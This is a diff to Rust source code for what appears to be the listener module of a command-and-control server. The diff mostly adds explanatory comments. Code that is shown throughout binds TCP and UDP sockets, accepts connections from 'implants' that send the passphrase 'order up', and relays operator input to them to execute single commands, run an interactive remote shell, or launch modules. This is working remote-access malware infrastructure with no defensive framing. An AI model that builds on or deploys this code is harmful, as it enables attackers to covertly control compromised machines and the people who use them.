@@ -32,7 +32,11 @@ pub struct SystemInfo {
     hostname: String,
 }
 
+// Structure for a network listener
+// contains both a UDP and TCP socket to be used as needed
+// contains an ID value to uniquely identify each listener
 pub struct Listener {
+    // Option wrappers used for support of None type object
     pub udp_sock: Option<UdpSocket>,
     pub tcp_sock: Option<TcpListener>,
     pub id: u64,
@@ -40,6 +44,7 @@ pub struct Listener {
     pub status: u8,
 }
 
+// Creates a blank listener
 pub fn new_lsn(i: u64) -> Listener {
     let ret = Listener {
         udp_sock: None,
@@ -50,11 +55,16 @@ pub fn new_lsn(i: u64) -> Listener {
     return ret;
 }
 
+// Used for transferring information between threads
+// control code used for giving commands
+// buff used for sharing data as byte vectors
 pub struct SharedBuffer {
     pub cc: u8,
     pub buff: Vec<u8>,
 }
 
+// Spawns a new listener
+// dispatches using a match statement to different functions based on what protocol is used
 pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
     match protocol {
         "udp" => listen_udp(lsn, address, sb),
@@ -70,40 +80,48 @@ pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, sb: &mut
 /****************************/
 
 // listens using a TcpListener
+// Begins in listneing mode (passively listens for connections from implants)
+// once connection with implant is established, swap to interact mode and interact with the implant
+//     for interact mode, see interact_tcp()
 fn listen_tcp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
-    lsn.status = 1;
+    lsn.status = 1; // listening mode
     lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
     println!("[+] Opening tcp listener on port {}", address.port());
     loop {
         // Checks for commands from the client each iteration
         let cmd: u8 = rcv_client_command(lsn, sb);
-        if cmd == 2 {
+        if cmd == 2 { // 2 means terminate connection and kill listener
             break;
         }
 
+        // attempt to accept TCP connections
         let acpt = lsn.tcp_sock.as_ref().expect("tcp listener not initialized").accept();
         match acpt {
+            // on a success, checks to see if "order up" was sent. if so, accept connection
             Ok((mut stream, _address)) => {
                 let mut buffer = [0; 2048];
                 let bytes = stream.read(&mut buffer[..]).unwrap();
 
                 // replace insides of .contains() with whatever string/key we are using to verify connection
                 if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
-                    lsn.status = 2;
+                    lsn.status = 2; // interact mode
                     stream.write("order recieved".as_bytes()).unwrap();
                     // switches to interact mode
                     interact_tcp(lsn, &mut stream, sb);
-                    lsn.status = 1;
+                    lsn.status = 1; // back to listening mode
                 }
                 stream.shutdown(Shutdown::Both).expect("shutdown call failed");
             }
             Err(e) => { /* Connection failed, nothing to do here. */ }
         }
     }
-    lsn.status = 0;
+    lsn.status = 0; // listener not running (dormant)
 }
 
 // listens using a UdpSocket
+// Begins in listening mode (passively listens for connections from implants)
+// once connection with implant is established, swap to interact mode and interact with the implant
+//     for interact mode, see interact_udp()
 fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
     // Setup socket to listen for implant connection
     lsn.status = 1;
@@ -113,42 +131,46 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
     loop {
         // Checks for commands from the client each iteration
         let cmd: u8 = rcv_client_command(lsn, sb);
-        if cmd == 2 {
+        if cmd == 2 { // 2 means terminate connection and kill listener
             break;
         }
 
+        // attempt to read from socket to verify a connection
         let mut buffer = [0; 2048];
         let (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer) {
             Ok((b, s)) => (b, s),
             Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
         };
 
-        // replace insides of .contains() with whatever string/key we are using to verify connection
+        // checks to see if bytes were recieved, and if so checks for "order up" to verify connection
         if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
-            lsn.status = 2;
+            lsn.status = 2; // interact mode
             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to("order recieved".as_bytes(), src);
             // switches to interact mode
             interact_udp(lsn, src, sb);
-            lsn.status = 1;
+            lsn.status = 1; // back to listening mode
         }
     }
-    lsn.status = 0;
+    lsn.status = 0; // listener not running (dormant)
 }
 
-// handles interaction with the implant
+// handles interaction with the implant via UDP
 // acts as a middleman between the implant and client
-// 0 => Do nothing
-// 
-// 
-// 
-// 
-// 
+// Control Codes:
+// 69 => exit shell (if in one)
+// 3 => terminate connection with implant and revert back to listening mode
+// 4 => Send a single command for the implant to execute
+// 5 => Start up a shell
+// 6 => Have the implant execute a module
+// anything else => do nothing (sleep for 10 ms to allow client to unlock shared buffer)
 fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
     println!("[+] Connection established by listener {}", lsn.id);
     let mut is_interacting: bool = false;
+    // memo keeps track of the last String contained within the shared buffer
+    // used so that listener can check to see if shared buffer has been read from or written to by client
     let mut memo: String = String::new();
     loop {
-        // live interaction with the implant
+        // live interaction with the implant shell
         if is_interacting {
             // checks if client is terminating interaction with target_src
             let cc: u8 = rcv_client_command(lsn, sb);
@@ -157,31 +179,37 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                 let code: u8 = 69;
                 lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
             }
-            // otherwise interact normally
+            // otherwise interact with shell normally
+            // simply being a middleman between client and implant
             else {
                 let mut sb_copy = sb.lock().unwrap();
                 if !vec_is_zero(&sb_copy.buff) && !String::from_utf8_lossy(&sb_copy.buff).to_string().eq(&memo){
                     // send null byte to indicate no change in cc
                     let code: u8 = 0;
                     lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
-                    // now send input
+                    // now send input from client to implant
                     lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
+                    // recieve output from implant
                     let mut output = [0; 2048];
                     let (mut bytes, mut src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
                         Ok((b, s)) => (b, s),
                         Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                     };
+                    // waits until output from implant has been recieved
                     while bytes == 0 {
                         (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
                             Ok((b, s)) => (b, s),
                             Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                         };
                     }
+                    // fill the shared buffer for the client to read from
                     sb_copy.buff = output.to_vec();
+                    // set the memo
                     memo = String::from_utf8_lossy(&sb_copy.buff).to_string();
                 }
             }
         }
+        // non-shell based interaction
         else {
             // check for client commands
             let cc: u8 = rcv_client_command(lsn, sb);
@@ -196,12 +224,16 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                 // send a single line command to the implant to execute
                 4 => {
                     let mut flag: bool = true;
+                    // loops until buffer is filled by client
                     while flag {
                         let mut sb_copy = sb.lock().unwrap();
+                        // if buffer filled
                         if !vec_is_zero(&sb_copy.buff) {
+                            // send the proper control code and command as a byte string
                             let code: u8 = 1;
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
+                            // loop until output is recieved from implant
                             let mut bytes = 0;
                             let mut src = SocketAddr::from(([0, 0, 0, 0], 0));
                             let mut output = [0; 2048];
@@ -212,6 +244,7 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                                         Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                                 };
                             }
+                            // once output is recieved, fill the buffer for the client to read from
                             sb_copy.buff = output.to_vec();
                             flag = false;
                         }
@@ -229,12 +262,16 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                 // tell the shell to execute a module
                 6 => {
                     let mut flag: bool = true;
+                    // loop until buffer is filled by client
                     while flag {
                         let mut sb_copy = sb.lock().unwrap();
+                        // if buffer is filled
                         if !vec_is_zero(&sb_copy.buff) {
+                            // send control code and module name as a byte string
                             let code: u8 = 3;
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
+                            // loop until output is recieved
                             let mut bytes = 0;
                             let mut src = SocketAddr::from(([0, 0, 0, 0], 0));
                             let mut output = [0; 2048];
@@ -245,6 +282,7 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                                         Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                                 };
                             }
+                            // once output recieved, fill buffer for client to read from
                             sb_copy.buff = output.to_vec();
                             flag = false;
                         }
@@ -253,6 +291,8 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                         }
                     }
                 },
+                // anything else, do nothing
+                // sleeps for 10ms to allow time for client to unlock mutex if needed
                 _u8 => {
                     thread::sleep(Duration::from_millis(10));
                 }
